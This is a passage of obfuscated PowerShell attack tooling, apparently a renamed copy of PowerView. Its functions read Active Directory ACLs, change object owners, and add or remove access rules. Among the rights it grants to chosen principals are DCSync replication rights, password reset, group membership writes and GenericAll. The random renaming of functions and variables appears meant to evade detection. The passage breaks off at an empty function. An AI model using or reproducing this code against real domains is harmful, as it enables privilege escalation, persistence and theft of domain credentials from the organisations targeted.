        [ValidateSet('Success', 'Failure')]
        [String]
        $yDqgxELR99,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $oehDHKNQ99,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $JkGFBBzV99,

        [Guid]
        $VEpabxsB99
    )

    Begin {
        if ($pVOfwkUl99 -notmatch '^S-1-.*') {
            $HyGvHNBk99 = @{
                'Identity' = $pVOfwkUl99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $HyGvHNBk99['Domain'] = $CkVWSEJU99 }
            if ($PSBoundParameters['Server']) { $HyGvHNBk99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['SearchScope']) { $HyGvHNBk99['SearchScope'] = $lGlQEcNF99 }
            if ($PSBoundParameters['ResultPageSize']) { $HyGvHNBk99['ResultPageSize'] = $ixOvvLXO99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $HyGvHNBk99['ServerTimeLimit'] = $EQlXfKFO99 }
            if ($PSBoundParameters['Tombstone']) { $HyGvHNBk99['Tombstone'] = $adpABMuf99 }
            if ($PSBoundParameters['Credential']) { $HyGvHNBk99['Credential'] = $tYWiEqAT99 }
            $xxSpwpKl99 = nostrums @PrincipalSearcherArguments
            if (-not $xxSpwpKl99) {
                throw "Unable to resolve principal: $pVOfwkUl99"
            }
            elseif($xxSpwpKl99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $KzjQfIqV99 = $xxSpwpKl99.objectsid
        }
        else {
            $KzjQfIqV99 = $pVOfwkUl99
        }

        $cRPuhKIE99 = 0
        foreach($r in $Right) {
            $cRPuhKIE99 = $cRPuhKIE99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $cRPuhKIE99 = [System.DirectoryServices.ActiveDirectoryRights]$cRPuhKIE99

        $lmPsrtYT99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$KzjQfIqV99)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -eq [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99
            } elseif($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$JkGFBBzV99)
            } elseif($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$JkGFBBzV99), $VEpabxsB99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -eq [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99, $oehDHKNQ99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99, $oehDHKNQ99, $JkGFBBzV99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $yDqgxELR99, $oehDHKNQ99, $JkGFBBzV99, $VEpabxsB99
            }

        }
        else {

            if($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -eq [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99
            } elseif($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$JkGFBBzV99)
            } elseif($oehDHKNQ99 -eq $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$JkGFBBzV99), $VEpabxsB99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -eq [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99, $oehDHKNQ99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99, $oehDHKNQ99, $JkGFBBzV99
            } elseif($oehDHKNQ99 -ne $null -and $JkGFBBzV99 -ne [String]::Empty -and $VEpabxsB99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $lmPsrtYT99, $cRPuhKIE99, $kZuTIZJV99, $oehDHKNQ99, $JkGFBBzV99, $VEpabxsB99
            }

        }
    }
}


function mystic {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $lmPsrtYT99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $IZcvwFLF99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        $DgPInybu99 = nostrums @SearcherArguments -Identity $IZcvwFLF99 -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($DgPInybu99) {
            $MeoWKFtj99 = [System.Security.Principal.SecurityIdentifier]$DgPInybu99
        }
        else {
            Write-Warning "[mystic] Error parsing owner identity '$IZcvwFLF99'"
        }
    }

    PROCESS {
        if ($MeoWKFtj99) {
            $nlvvSWoK99['Raw'] = $True
            $nlvvSWoK99['Identity'] = $lmPsrtYT99

            $hPnMOrXw99 = nostrums @SearcherArguments

            ForEach ($Object in $hPnMOrXw99) {
                try {
                    Write-Verbose "[mystic] Attempting to set the owner for '$lmPsrtYT99' to '$IZcvwFLF99'"
                    $Entry = $hPnMOrXw99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($MeoWKFtj99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[mystic] Error setting owner: $_"
                }
            }
        }
    }
}


function tracery {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $lmPsrtYT99,

        [Switch]
        $Sacl,

        [Switch]
        $GWNRyiuj99,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $CESAUplj99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $nlvvSWoK99['SecurityMasks'] = 'Sacl'
        }
        else {
            $nlvvSWoK99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $cPmTyRvC99 = misbehaves @SearcherArguments

        $ZqkZGDZx99 = @{}
        if ($PSBoundParameters['Domain']) { $ZqkZGDZx99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $ZqkZGDZx99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZqkZGDZx99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZqkZGDZx99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Credential']) { $ZqkZGDZx99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Welch @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($cPmTyRvC99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^S-1-.*') {
                    $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                }
                elseif ($svVwDJqZ99 -match '^(CN|OU|DC)=.*') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[tracery] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $cPmTyRvC99 = misbehaves @SearcherArguments
                        if (-not $cPmTyRvC99) {
                            Write-Warning "[tracery] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                }
                elseif ($svVwDJqZ99.Contains('.')) {
                    $OfuxkWWH99 += "(|(samAccountName=$svVwDJqZ99)(name=$svVwDJqZ99)(dnshostname=$svVwDJqZ99))"
                }
                else {
                    $OfuxkWWH99 += "(|(samAccountName=$svVwDJqZ99)(name=$svVwDJqZ99)(displayname=$svVwDJqZ99))"
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[tracery] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            if ($HLDsNhab99) {
                $cPmTyRvC99.filter = "(&$HLDsNhab99)"
            }
            Write-Verbose "[tracery] tracery filter string: $($cPmTyRvC99.filter)"

            $DEbeunXw99 = $cPmTyRvC99.FindAll()
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $KzjQfIqV99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $KzjQfIqV99 = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $FoHYQKKl99 = Switch ($CESAUplj99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $FoHYQKKl99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $KzjQfIqV99
                                $gspZxqRT99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $KzjQfIqV99
                            $gspZxqRT99 = $True
                        }

                        if ($gspZxqRT99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $SpdXdGZZ99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $SpdXdGZZ99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $SpdXdGZZ99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $SpdXdGZZ99[$_.Name] = $_.Value
                                    }
                                }
                                $ToikAfAj99 = New-Object -TypeName PSObject -Property $SpdXdGZZ99
                                $ToikAfAj99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $ToikAfAj99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[tracery] Error: $_"
                }
            }
        }
    }
}


function telecommuted {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $IaoZaZbm99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ydWBwabR99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ltYRHIWc99,

        [ValidateNotNullOrEmpty()]
        [String]
        $pfqQVcxY99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pVOfwkUl99,

        [ValidateNotNullOrEmpty()]
        [String]
        $CkVWSEJU99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $alYJZSwo99 = 'All',

        [Guid]
        $GbmBlHmL99
    )

    BEGIN {
        $oSTDzxUZ99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $oSTDzxUZ99['Domain'] = $ydWBwabR99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $oSTDzxUZ99['LDAPFilter'] = $ltYRHIWc99 }
        if ($PSBoundParameters['TargetSearchBase']) { $oSTDzxUZ99['SearchBase'] = $pfqQVcxY99 }
        if ($PSBoundParameters['Server']) { $oSTDzxUZ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $oSTDzxUZ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $oSTDzxUZ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $oSTDzxUZ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $oSTDzxUZ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $oSTDzxUZ99['Credential'] = $tYWiEqAT99 }

        $HyGvHNBk99 = @{
            'Identity' = $pVOfwkUl99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $HyGvHNBk99['Domain'] = $CkVWSEJU99 }
        if ($PSBoundParameters['Server']) { $HyGvHNBk99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HyGvHNBk99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HyGvHNBk99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HyGvHNBk99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HyGvHNBk99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HyGvHNBk99['Credential'] = $tYWiEqAT99 }
        $slcxLjoJ99 = nostrums @PrincipalSearcherArguments
        if (-not $slcxLjoJ99) {
            throw "Unable to resolve principal: $pVOfwkUl99"
        }
    }

    PROCESS {
        $oSTDzxUZ99['Identity'] = $IaoZaZbm99
        $kaCaqZQJ99 = nostrums @TargetSearcherArguments

        ForEach ($yWVPvPZJ99 in $kaCaqZQJ99) {

            $JkGFBBzV99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $GTDHWBFO99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($GbmBlHmL99) {
                $GUIDs = @($GbmBlHmL99)
            }
            else {
                $GUIDs = Switch ($alYJZSwo99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($naxzghyA99 in $slcxLjoJ99) {
                Write-Verbose "[telecommuted] Granting principal $($naxzghyA99.distinguishedname) '$alYJZSwo99' on $($yWVPvPZJ99.Properties.distinguishedname)"

                try {
                    $lmPsrtYT99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$naxzghyA99.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NnoVugFr99 = New-Object Guid $GUID
                            $JoGzuNtt99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $lmPsrtYT99, $JoGzuNtt99, $GTDHWBFO99, $NnoVugFr99, $JkGFBBzV99
                        }
                    }
                    else {
                        $JoGzuNtt99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $lmPsrtYT99, $JoGzuNtt99, $GTDHWBFO99, $JkGFBBzV99
                    }

                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[telecommuted] Granting principal $($naxzghyA99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($yWVPvPZJ99.Properties.distinguishedname)"
                        $pyljdyHn99 = $yWVPvPZJ99.GetDirectoryEntry()
                        $pyljdyHn99.PsBase.Options.SecurityMasks = 'Dacl'
                        $pyljdyHn99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $pyljdyHn99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[telecommuted] Error granting principal $($naxzghyA99.distinguishedname) '$alYJZSwo99' on $($yWVPvPZJ99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Mugabe {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $IaoZaZbm99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ydWBwabR99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ltYRHIWc99,

        [ValidateNotNullOrEmpty()]
        [String]
        $pfqQVcxY99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pVOfwkUl99,

        [ValidateNotNullOrEmpty()]
        [String]
        $CkVWSEJU99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $alYJZSwo99 = 'All',

        [Guid]
        $GbmBlHmL99
    )

    BEGIN {
        $oSTDzxUZ99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $oSTDzxUZ99['Domain'] = $ydWBwabR99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $oSTDzxUZ99['LDAPFilter'] = $ltYRHIWc99 }
        if ($PSBoundParameters['TargetSearchBase']) { $oSTDzxUZ99['SearchBase'] = $pfqQVcxY99 }
        if ($PSBoundParameters['Server']) { $oSTDzxUZ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $oSTDzxUZ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $oSTDzxUZ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $oSTDzxUZ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $oSTDzxUZ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $oSTDzxUZ99['Credential'] = $tYWiEqAT99 }

        $HyGvHNBk99 = @{
            'Identity' = $pVOfwkUl99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $HyGvHNBk99['Domain'] = $CkVWSEJU99 }
        if ($PSBoundParameters['Server']) { $HyGvHNBk99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HyGvHNBk99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HyGvHNBk99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HyGvHNBk99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HyGvHNBk99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HyGvHNBk99['Credential'] = $tYWiEqAT99 }
        $slcxLjoJ99 = nostrums @PrincipalSearcherArguments
        if (-not $slcxLjoJ99) {
            throw "Unable to resolve principal: $pVOfwkUl99"
        }
    }

    PROCESS {
        $oSTDzxUZ99['Identity'] = $IaoZaZbm99
        $kaCaqZQJ99 = nostrums @TargetSearcherArguments

        ForEach ($yWVPvPZJ99 in $kaCaqZQJ99) {

            $JkGFBBzV99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $GTDHWBFO99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($GbmBlHmL99) {
                $GUIDs = @($GbmBlHmL99)
            }
            else {
                $GUIDs = Switch ($alYJZSwo99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($naxzghyA99 in $slcxLjoJ99) {
                Write-Verbose "[Mugabe] Removing principal $($naxzghyA99.distinguishedname) '$alYJZSwo99' from $($yWVPvPZJ99.Properties.distinguishedname)"

                try {
                    $lmPsrtYT99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$naxzghyA99.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NnoVugFr99 = New-Object Guid $GUID
                            $JoGzuNtt99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $lmPsrtYT99, $JoGzuNtt99, $GTDHWBFO99, $NnoVugFr99, $JkGFBBzV99
                        }
                    }
                    else {
                        $JoGzuNtt99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $lmPsrtYT99, $JoGzuNtt99, $GTDHWBFO99, $JkGFBBzV99
                    }

                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Mugabe] Granting principal $($naxzghyA99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($yWVPvPZJ99.Properties.distinguishedname)"
                        $pyljdyHn99 = $yWVPvPZJ99.GetDirectoryEntry()
                        $pyljdyHn99.PsBase.Options.SecurityMasks = 'Dacl'
                        $pyljdyHn99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $pyljdyHn99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Mugabe] Error removing principal $($naxzghyA99.distinguishedname) '$alYJZSwo99' from $($yWVPvPZJ99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Nicene {

